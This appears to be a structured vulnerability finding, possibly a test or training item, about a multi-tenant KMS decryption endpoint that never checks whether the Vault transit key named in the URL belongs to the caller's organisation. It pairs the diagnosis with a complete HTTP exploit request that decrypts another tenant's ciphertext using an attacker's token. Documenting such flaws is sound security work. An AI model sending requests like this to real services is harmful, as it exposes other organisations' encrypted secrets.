diagnosis: The KMS decryption endpoint uses the HashiCorp Vault transit engine to decrypt ciphertexts using key_name supplied in the URL path. It validates user authentication but does not verify whether key_name belongs to user.organization_id. An attacker possessing ciphertexts obtained from another tenant can decrypt them using that tenant's dedicated Vault transit encryption key.
exploit_request:
POST /kms/keys/org_enterprise_master_key/decrypt HTTP/1.1
Host: kms.vault-service.io
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"ciphertext": "vault:v1:8aZ...=="}
